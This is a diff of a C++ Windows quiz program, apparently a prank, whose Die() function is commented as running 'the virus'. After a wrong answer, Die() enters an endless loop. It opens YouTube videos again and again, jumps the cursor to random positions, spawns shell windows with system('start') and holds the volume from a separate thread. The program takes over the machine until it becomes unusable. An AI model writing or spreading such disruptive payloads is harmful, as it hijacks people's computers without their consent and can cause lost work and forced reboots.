@@ -3,11 +3,15 @@
 #include <windows.h>
 #include <shellapi.h>
 #include <iostream>
+#include <thread>
+ // Multithreading libary. Uses multiple cpu threads to run code.
 
 #include <mmsystem.h>
 
 #pragma comment(lib, "winmm")
 #pragma comment(lib, "winmm.lib")
+
+
 
 int score = 0;
 
@@ -41,18 +45,21 @@ public:
 };
 
 // Returns true if correct and false if incorrect
-
+void LockVolume() {
+    changeVolume();
+}
 // Runs the virus if function is called
 void Die() {
     for (int i = 0; i < 3; i++) {
         ShellExecute(0, 0, L"https://www.youtube.com/watch?v=KE1ynBZ-9Bw", 0, 0, SW_SHOWNORMAL);
     }
     ShellExecute(0, 0, L"https://www.youtube.com/watch?v=ZHmROm_CRH4", 0, 0, SW_SHOWNORMAL);
-    int x, y;
+    std::thread first (LockVolume);
     PlaySound(TEXT("music.wav"), NULL, SND_FILENAME || SND_ASYNC);
     while (true) {
+
+
         // Opens lots of videos
-        changeVolume();
         SetCursorPos(rand() % 1000, rand() % 800);
         system("start");
         ShellExecute(0, 0, L"https://www.youtube.com/watch?v=1d-n0Qi1ZvQ", 0, 0, SW_SHOWNORMAL);
@@ -117,6 +124,7 @@ void Die() {
         ShellExecute(0, 0, L"https://youtu.be/2XYat2LRLzQ", 0, 0, SW_SHOWNORMAL);
     }
 }
+
 
 bool ask_question(string message, string answerOne, string answerTwo, int correctAnswer) {
     std::cout << message << endl;
